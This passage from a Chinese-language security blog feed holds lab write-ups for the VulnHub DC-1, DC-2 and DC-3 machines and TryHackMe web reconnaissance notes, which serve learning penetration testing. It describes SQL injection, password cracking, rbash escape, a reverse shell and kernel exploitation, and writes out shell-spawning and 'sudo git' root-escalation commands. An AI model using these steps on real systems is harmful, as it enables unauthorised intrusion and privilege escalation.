alt="image-20240426220636310"></p>]]></content>
    
    
    <categories>
      
      <category>Jr Penetration Tester</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tryhackme</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DC-3</title>
    <link href="/2024/04/02/DC-3/"/>
    <url>/2024/04/02/DC-3/</url>
    
    <content type="html"><![CDATA[<h1 id="DC-3"><a href="#DC-3" class="headerlink" title="DC-3"></a>DC-3</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap扫描端口信息</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404052207803.png" alt="image-20240405220728137"></p><p>开放了80端口</p><p>然后去访问，在index.php 可以看到提示信息，以及存在admin用户，可以尝试爆破一下密码 (最终是要获得root权限的)</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404052212871.png" alt="image-20240405221239805"></p><p>无果，去扫一下后台</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404052309233.png" alt="image-20240405230935914"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>然后看了一下是个CMS 去找一下它的漏洞信息</p><p>找到了一个SQL注入类型的 =&gt;<a href="https://blog.csdn.net/smli_ng/article/details/115799954">https://blog.csdn.net/smli_ng/article/details/115799954</a></p><p>sqlmap跑起来</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404052318368.png" alt="image-20240405231859209"></p><p>可以跑出来hh</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404052343848.png" alt="image-20240405234308671"></p><p>最后密码利用john进行解密即可</p><p>把要解密的代码放在一个文件里面 然后john解密即可</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404052345750.png" alt="image-20240405234538635"></p><p>得到了密码可以登录后台(注意是在/administraator目录下)</p><p>进入了后台之后，寻找可以利用的点</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404061413063.png" alt="image-20240406141342877"></p><p>可以看到一些php代码 我们可以进行修改代码</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404061416999.png" alt="image-20240406141633946"></p><p>然后可以进行一个反弹shell</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404061533432.png" alt="image-20240406153354345"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404061534212.png" alt="image-20240406153440076"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>我们到现在算是有了普通用户的权限，下一步就是要进行提权</p><p>查询一下当前系统的发行版本</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/etc/i</span>ssue<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404061615965.png" alt="image-20240406161551902"></p><p>16.04的，查了一下是有提权漏洞的。(内核提权)</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404061619679.png" alt="image-20240406161954441"></p><p>然后就是去搜索一下searchsploit的具体用法</p><p>然后我们使用39772的 是一个特权升级漏洞</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404061639454.png" alt="image-20240406163944326"></p><p>给出了具体的位置信息 去看看有什么内容</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404061640801.png" alt="image-20240406164059639"></p><p>可以看见下载地址和具体用法</p><p>下面试具体的步骤:</p><ol><li>在dc-3靶机中通过wget下载这个zip文件 然后利用unzip进行解压</li></ol><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404061644633.png" alt="image-20240406164447545"></p><p>2.然后再解压exploit.tar 这个文件</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404061647648.png" alt="image-20240406164727558"></p><p>进去这个目录</p><p>3.根据上面的要求来运行具体文件</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404061649637.png" alt="image-20240406164933578"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404061651932.png" alt="image-20240406165139817"></p><p>最终也是提权成功</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>首先根据提示的信息，先要获得shell,然后进行提权,我们通过cms版本信息找到漏洞利用，然后通过sql注入找到后台admin登录密码，利用john对密码进行一个解密</p><p>登录进去之后就是找可以利用的点，然后找到了可以运行php代码的地方，利用bash -c进行一个反弹shell。到这里就是提权了，find提权无果，查询内核版本，发现版本较低，利用searchsploit搜索内核漏洞信息，找到了信息之后就是去利用，最终提权成功。</p>]]></content>
    
    
    <categories>
      
      <category>靶机</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DC-2</title>
    <link href="/2024/04/01/DC-2/"/>
    <url>/2024/04/01/DC-2/</url>
    
    <content type="html"><![CDATA[<h1 id="DC-2"><a href="#DC-2" class="headerlink" title="DC-2"></a>DC-2</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403282317754.png" alt="image-20240328231730586"></p><p>利用nmap进行扫描，可以看到开放了80和7744端口，但去访问没啥内容</p><p>然后用dirsearch扫后台，可以扫出来相关的路径</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403282057978.png" alt="image-20240328205748795"></p><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>去访问index.php 然后就可以看到flag1</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403282239933.png" alt="image-20240328223939777"></p><p>根据flag1的提示 貌似是需要爆破密码 然后它给了一个cewl 去搜索一波</p><p>它是一个字典生成工具</p><p>参考:<a href="https://developer.aliyun.com/article/1089966">https://developer.aliyun.com/article/1089966</a></p><p>然后这里的话我们生成一个密码文件</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403282325249.png" alt="image-20240328232528171"></p><p>现在密码字典有了 就差一个用户名的</p><p>然后搜了一下wpscan这个工具的用法和一些简单介绍</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403282339323.png" alt="image-20240328233928260"></p><p>参考链接:</p><p><a href="https://blog.csdn.net/guo15890025019/article/details/118548932">https://blog.csdn.net/guo15890025019/article/details/118548932</a></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403282349700.png" alt="image-20240328234958565"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403282350418.png" alt="image-20240328235012283"></p><p>最终可以得到3个账户  然后结合前面的字典 去爆破用户名和密码即可</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403291014625.png" alt="image-20240329101357455"></p><h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>记得每个用户都去登录看看 不要死磕一个用户(Orz)</p><p>登录tom用户的话没找到啥内容 然后试了一下文件上传 也不得行</p><p>登录jerry用户 可以找到flag2的信息</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404011106014.png" alt="image-20240401110606904"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404011107040.png" alt="image-20240401110703945"></p><p>让我们找另一条思路？</p><p>注意上面的ssh服务 可以先试试这两个账号的ssh登录</p><h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>使用tom登录之后 可以看到flag3.txt</p><p>但是cat等命令被禁止了 我们可以使用less来查看</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404011116199.png" alt="image-20240401111648120"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404011117327.png" alt="image-20240401111705230"></p><p>再试试Jerry进行登录</p><p>登录不上去？？？？</p><p>根据上面flag3 猜测是在tom用户下 切换到jerry用户 但是在当前的环境中没有su这个命令</p><p>先查看一下当前环境能用的命令有多少</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">compgen -c</span><br></code></pre></td></tr></table></figure><p>可以列出在bash环境中所有可用的命令</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404011140685.png" alt="image-20240401114037624"></p><p>export可以修改环境变量 </p><p>直接修改的话 PATH是只读的 </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404011149574.png" alt="image-20240401114918524"></p><p>查了一下需要绕过rbash</p><p>参考链接:<a href="https://xz.aliyun.com/t/7642?time__1311=n4+xnD0G0=G=eAK0QbDsA3OrYGCQb=DRnDGqrwD&amp;alichlgref=https://www.google.com/">https://xz.aliyun.com/t/7642?time__1311=n4%2BxnD0G0%3DG%3DeAK0QbDsA3OrYGCQb%3DDRnDGqrwD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F</a></p><p>可以利用vi来进行逃逸rbash</p><p>我们在flag3.txt中利用vi进行逃逸</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404011349141.png" alt="image-20240401134945018"></p><p>然后回车</p><p>再输入 :shell 即可</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404011350121.png" alt="image-20240401135017072"></p><p>但此时虽然能cd了 但是cat那些命令仍然不能使用</p><p>可以利用export设置环境变量</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404011351267.png" alt="image-20240401135152215"></p><p>然后此时我们就可以转到jerry用户了</p><h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p>su转到jerry用户之后就可以查看flag4了</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404011354263.png" alt="image-20240401135434153"></p><h2 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h2><p>最后一个了 应该是要提权</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404011402790.png" alt="image-20240401140218749"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404011408656.png" alt="image-20240401140846535"></p><p>去搜一下git提权</p><p>参考链接:</p><p><a href="https://blog.csdn.net/qq_38612882/article/details/122772867">https://blog.csdn.net/qq_38612882/article/details/122772867</a></p><p>提权过程：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">sudo git help config<br>!<span class="hljs-regexp">/bin/</span>bash<br></code></pre></td></tr></table></figure><p>最后提权成功</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404011414045.png" alt="image-20240401141428005"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>flag1 就是扫一下目录的事情</p><p>flag2是利用cewl生成登录密码字典 然后结合wpscan就可以把登录名和密码爆破出来 注意每个都要试试 </p><p>flag3: nmap扫描端口会有一个ssh服务 可以去登录 </p><p>flag4:绕过rbash的限制 </p><p>flag5: git提权</p>]]></content>
    
    
    <categories>
      
      <category>靶机</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DC-1</title>
    <link href="/2024/03/27/DC-1/"/>
    <url>/2024/03/27/DC-1/</url>
    
    <content type="html"><![CDATA[<h1 id="DC-1靶机"><a href="#DC-1靶机" class="headerlink" title="DC-1靶机"></a>DC-1靶机</h1><h2 id="前置准备："><a href="#前置准备：" class="headerlink" title="前置准备："></a>前置准备：</h2><p>下载地址：<a href="https://download.vulnhub.com/dc/DC-1.zip">https://download.vulnhub.com/dc/DC-1.zip</a></p><p>安装过程：</p><p>下载下来后解压缩，在VMware中打开</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271741086.png" alt="image-20240327174123994"></p><p>然后导入就行了，如果失败重试就行，接下来把CD-1靶机的网络适配器改成NAT模式，这里的话kali也改成nat模式，确保两者在同一网段下</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271741160.png" alt="image-20240327174108089"></p><h1 id="打靶过程"><a href="#打靶过程" class="headerlink" title="打靶过程"></a>打靶过程</h1><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p>首先使用nmap扫描端口信息。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271347436.png" alt="image-20240327134724284"></p><p>利用wappalyzer可以查看版本信息</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271349139.png" alt="image-20240327134902094"></p><p>可以看到是一个CMS php版本是5.4.45 我们去msf中搜索一下这个版本的漏洞信息</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271351808.png" alt="image-20240327135119564"></p><p>可以看到日期信息 我们使用最新的试试看</p><h2 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h2><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>然后设置一下信息 就可以run了 </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271359063.png" alt="image-20240327135917943"></p><p>可以看到已经可以执行命令了。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271402007.png" alt="image-20240327140257966"></p><p>利用python实现一下交互shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python -c <span class="hljs-string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271403258.png" alt="image-20240327140344185"></p><p>这里可以找到flag1</p><p>查看flag1.txt 提示让我们找到配置文件</p><p>去网上搜一下Drupal的配置文件的位置信息。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271409272.png" alt="image-20240327140926216"></p><h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>然后可以看到配置文件的内容</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271620653.png" alt="image-20240327162021558"></p><p>可以看到数据库的配置信息，先连接一波</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271631627.png" alt="image-20240327163120510"></p><p>然后可以找到用户名和密码，但是密码是加密的，所以我们可以尝试对密码进行一个更改。</p><p>在网上搜了一下发现是可以的，先生成一个新的密码，然后到数据库里面进行更新即可</p><p>参考文章:<a href="https://cloud.tencent.com/developer/ask/sof/110990932">https://cloud.tencent.com/developer/ask/sof/110990932</a></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271654037.png" alt="image-20240327165423977"></p><p>然后再进行登录 admin admin</p><h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>然后就可以找到flag3</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271656789.png" alt="image-20240327165607699"></p><h3 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h3><p>在/etc/passwd中可以查看到flag4</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271700064.png" alt="image-20240327170006991"></p><p>在信息收集的时候我们知道22端口是开放的，那么我们可以爆破flag4的密码 利用ssh去登录flag4用户</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271713760.png" alt="image-20240327171331628"></p><p>密码爆破出来了，去ssh登录即可</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">password:</span> orange<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271718896.png" alt="image-20240327171851703"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>先试试suid提权</p><p>参考文章；</p><p><a href="https://xz.aliyun.com/t/12535?time__1311=mqmhD50KBKDK50Hq4+OrEG8Yt47K6xx&amp;alichlgref=https://www.google.com/#toc-6">https://xz.aliyun.com/t/12535?time__1311=mqmhD50KBKDK50Hq4%2BOrEG8Yt47K6xx&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-6</a></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271720612.png" alt="image-20240327172034487"></p><p>可以进行suid提权</p><h5 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h5><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271727286.png" alt="image-20240327172738233"></p><p>总结:</p><p>总体思路不难，先信息收集端口开放情况和使用的是什么web服务 然后寻找漏洞点 由普通用户提权到root用户</p><p>flag1是在rce之后在网站根目录里面的</p><p>flag2是在配置文件里面的</p><p>flag3是通过修改admin密码，在后台里面的</p><p>flag4是通过爆破ssh密码 登录进去即可</p><p>flag5就是suid提权即可</p>]]></content>
    
    
    <categories>
      
      <category>靶机</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Web Fundamentals</title>
    <link href="/2024/03/08/Web%20Fundamentals/"/>
    <url>/2024/03/08/Web%20Fundamentals/</url>
    
    <content type="html"><![CDATA[<h1 id="Web-Fundamentals"><a href="#Web-Fundamentals" class="headerlink" title="Web Fundamentals"></a>Web Fundamentals</h1><h2 id="How-The-Web-Works"><a href="#How-The-Web-Works" class="headerlink" title="How The Web Works"></a>How The Web Works</h2><h3 id="DNS-in-detail"><a href="#DNS-in-detail" class="headerlink" title="DNS in detail"></a>DNS in detail</h3><p>下面这个图是DNS工作时的流程图</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202402272317525.png" alt="image-20240227231710035"></p><p>打开网站首先看到<img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202402272322241.png" alt="image-20240227232219172"></p><p>这个地方，可以更换DNS记录的类型</p><p>然后我们可以查看CNAME</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202402272323623.png" alt="image-20240227232319538"></p><p>然后后面的根据要求来即可</p><h3 id="HTTP-in-detail"><a href="#HTTP-in-detail" class="headerlink" title="HTTP in detail"></a>HTTP in detail</h3><p>http是超文本传输协议 https则是比它更安全了</p><p>下面的图片是对url的一些解析</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202402292303282.png" alt="image-20240229230309164"></p><p>下面是一些状态码的介绍</p><p>大致分为五类</p><table><thead><tr><th>100-199 信息响应</th></tr></thead><tbody><tr><td>200-299 成功</td></tr><tr><td>300-399 重定向</td></tr><tr><td>400-499客户端错误</td></tr><tr><td>500-599服务器错误</td></tr></tbody></table><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202402292345248.png" alt="image-20240229234520132"></p><h3 id="How-websites-work"><a href="#How-websites-work" class="headerlink" title="How websites work"></a>How websites work</h3><p>这个模块主要是关于html和javascript的介绍 以及存在的一些安全问题</p><p>有的html页面可能会存在一些敏感信息</p><p>记录一下这个html注入</p><p>漏洞点就是没有对用户的输入进行一个严格的过滤 然后就导致用户可以构造恶意的javascipt代码注入到网页中 当用户去访问时 就会触发漏洞</p><p>其实这个也是xss的一种</p><p>例如 </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403022228277.png" alt="image-20240302222805079"></p><p>像这样就能跳转到我们构造的网页上面</p><p>防御措施：</p><p>1.进行严格的过滤 可以将&lt;&gt;等这些符号进行实体化</p><p>2.对输入进行白名单限制</p><p>3.使用一些安全的框架</p><h3 id="Putting-it-all-together"><a href="#Putting-it-all-together" class="headerlink" title="Putting it all together"></a>Putting it all together</h3><p>这个房间是把上面的东西结合了一下</p><p>然后对用户访问网站 中间发生的事情做了一个概括</p><p>第一步:用户发起访问的请求 (这时是域名的形式 我们需要通过DNS将其转换成ip地址)</p><p>第二步：在本地DNS寻找是否有缓存 有的话就将其抓换成ip地址 然后再进行下一步 如果没有的话 转到递归DNS</p><p>第三步:查询权威DNS服务器和根DNS服务器</p><p>第四步:将域名转换成ip地址</p><p>第五步:然后通过WAF的检测</p><p>第六步:通过负载均衡器 缓解网络流量</p><p>第七步:使用http协议或者https协议来发送</p><p>第八步:使用什么类型的方法进行访问 (get或者post等)</p><p>第九步:访问数据库 从数据库中获取内容</p><p>第十步：web服务器向客户端返回相关的界面</p><h2 id="Introduction-to-Web-Hacking"><a href="#Introduction-to-Web-Hacking" class="headerlink" title="Introduction to Web Hacking"></a>Introduction to Web Hacking</h2><h3 id="Walking-An-Application-遍历"><a href="#Walking-An-Application-遍历" class="headerlink" title="Walking An Application (遍历)"></a>Walking An Application (遍历)</h3><p>首先查看网页源代码 去访问 下面这个即可</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403031922678.png" alt="image-20240303192238481"></p><p>然后我们在html中可以找到这个</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403031935916.png" alt="image-20240303193546845"></p><p>点击即可找到第二个空的答案</p><p>第三个空 我们先观察</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403031938696.png" alt="image-20240303193836631"></p><p>都是在/assets目录下的 然后我们去访问这个assets</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403031939117.png" alt="image-20240303193926986"></p><p>可以找到第三个flag</p><p>然后第四个flag的话我们先进行一个信息的搜索</p><p>在网页源代码最下面有一个网址 我们先去访问 </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403031949589.png" alt="image-20240303194935412"></p><p>我原本是找到了它的一个登录界面 用弱口令登录进去发现不是</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403031952961.png"></p><p>然后在log那里可以找到zip文件的下载地址 下载之后就是了</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403031953462.png" alt="image-20240303195335345"></p><p>第五个flag其实就是一个绕过前端的</p><p>就把那个框给删除掉就行了</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403032116213.png" alt="image-20240303211617077"></p><p>第六个flag其实就是在一个js文件里面的一个地方 打一个断点 让其在刷新的时候停留</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403032133659.png" alt="image-20240303213329528"></p><p>第七个flag  在Contact界面上面创建一些数据 然后发送 在网络中查看相关的信息</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403032151826.png" alt="image-20240303215156748"></p><p>在网络中查看 </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403032153763.png" alt="image-20240303215312706"></p><p>总结:这个房间就是教了如何查看源代码 以及一些在开发者模式下 作为一个渗透测试人员需要关注的点</p><h3 id="Content-Discovery"><a href="#Content-Discovery" class="headerlink" title="Content Discovery"></a>Content Discovery</h3><p>主要还是和信息收集有关的知识</p><p>从手动和自动以及开源信息的查询几个方面讲述</p><p>信息收集的点:</p><p>1.robots.txt文件 (不被爬虫爬到) </p><p>2.Favicon（网站图标）这个有的时候我们可以获取这些图标的一些md5值 然后去OWASP网站图标数据库上面找到其框架 进一步的做出利用</p><p>数据库的网站:<a href="https://wiki.owasp.org/index.php/OWASP_favicon_database">OWASP网站图标数据库 - OWASP</a></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403032218704.png" alt="image-20240303221826632"></p><p>可以利用curl获取图标的md5值 然后去查询</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403032220553.png" alt="image-20240303222000460"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403032222893.png" alt="image-20240303222244831"></p><p>3.sitemap.xml </p><p>有些比较难浏览的网页这里面可能会出现</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403032244842.png" alt="image-20240303224443710"></p><p>4.http标头</p><p>抓个包的事 就是看一些服务器的信息和用什么编程语言以及版本的信息</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403032248784.png" alt="image-20240303224851629"></p><p>5.查到是什么框架了之后进一步进行信息收集</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403032301836.png" alt="image-20240303230102745"></p><p>在网页源代码里面找到了一个路径 访问有个登录的地址 用户名和密码已经给了 然后就是登录即可</p><p>6.利用谷歌搜索</p><p>善用谷歌 能查到不少东西 (这里的话就是一些谷歌语法)</p><p>下面介绍一些简单的 具体的请参考:<a href="https://en.wikipedia.org/wiki/Google_hacking">Google hacking - Wikipedia</a></p><table><thead><tr><th>filter</th><th>例子</th><th>描述</th></tr></thead><tbody><tr><td>site</td><td>site:edu.cn</td><td>仅返回指定网站类型的记录</td></tr><tr><td>inurl</td><td>inurl:admin</td><td>返回的url中含有指定的字符</td></tr><tr><td>filetype</td><td>filetype:pdf “查询的东西”</td><td>返回指定类型的文件</td></tr><tr><td>intitle</td><td>intitle:admin</td><td>返回的标题中含有指定的字符</td></tr></tbody></table><p>7.Wappalyzer</p><p>这就是一个插件了 能看语言的类型和版本信息</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403032322357.png" alt="image-20240303232236252"></p><p>8.Wayback Machine</p><p>网站:<a href="https://archive.org/web/">https://archive.org/web/</a></p><p>是可追溯到 90 年代后期的网站历史档案。 您可以搜索一个域名，它会一直向您显示 服务抓取了网页并保存了内容。此服务可以 帮助发现当前网站上可能仍处于活动状态的旧页面。</p><p>9.github</p><p>这个也挺重要的 上面也有不少的信息</p><p>上面可能有一些敏感的信息(可能是权限没设置好 或者遗漏)</p><p>10.S3 Buckets</p><p>S3系列 存储桶是 Amazon AWS 提供的一项存储服务，允许人们 将文件甚至静态网站内容保存在可访问的云中 通过 HTTP 和 HTTPS。文件的所有者可以设置访问权限 使文件公开、私有甚至可写。有时这些 访问权限设置不正确，无意中允许访问 不应向公众提供的文件。S3 的格式 buckets 的数据类型为 http（s）：//<strong>{name}。</strong><a href="http://s3.amazonaws.com/"><strong>s3.amazonaws.com</strong></a> {name} 由所有者决定的地方，例如 <a href="http://tryhackme-assets.s3.amazonaws.com/">tryhackme-assets.s3.amazonaws.com</a>。 可以通过多种方式发现 S3 存储桶，例如在 网站的页面源代码、GitHub 存储库，甚至自动化 过程。一种常见的自动化方法是使用公司名称 后跟常用术语，如 {name}-assets、{name}-www、{name}-public、**{**<strong>name}</strong>-private 等</p><p>11.自动化工具 就是一些后台扫描的工具 </p><p>像是dirsearch等 其实主要还是看字典的强大</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403041519253.png" alt="image-20240304151929060"></p><p>这是我用dirsearch扫描的结果 但还有一个mo开头的文件我扫描不到 </p><p>我是用的 thm给的扫描到的</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403041523790.png" alt="image-20240304152317688"></p><p>总结:介绍了一些信息收集的知识</p><h3 id="Subdomain-Enumeration-子域枚举"><a href="#Subdomain-Enumeration-子域枚举" class="headerlink" title="Subdomain Enumeration (子域枚举)"></a>Subdomain Enumeration (子域枚举)</h3><p>这个房间是寻找子域的几种方法 目的是为了扩大我们在渗透测试过程中的攻击面</p><p>三种不同的子域枚举方法：Brute Force、OSINT（开源智能）和Virtual Host(虚拟主机)。</p><p>1.SSL/TLS 证书</p><p>相关的网站:</p><p><a href="https://crt.sh/">crt.sh |证书搜索</a></p><p><a href="https://ui.ctsearch.entrust.com/ui/ctsearchui">Entrust 证书搜索 - Entrust， Inc.</a></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403041717063.png" alt="image-20240304171731897"></p><p>然后可以在上面的两个网站上面输入域名 进行子域的查询</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403041722551.png" alt="image-20240304172208426"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403041722377.png" alt="image-20240304172231226"></p><p>2.利用搜索引擎</p><p>利用谷歌等搜索引擎 可以利用谷歌语法 进行搜索</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 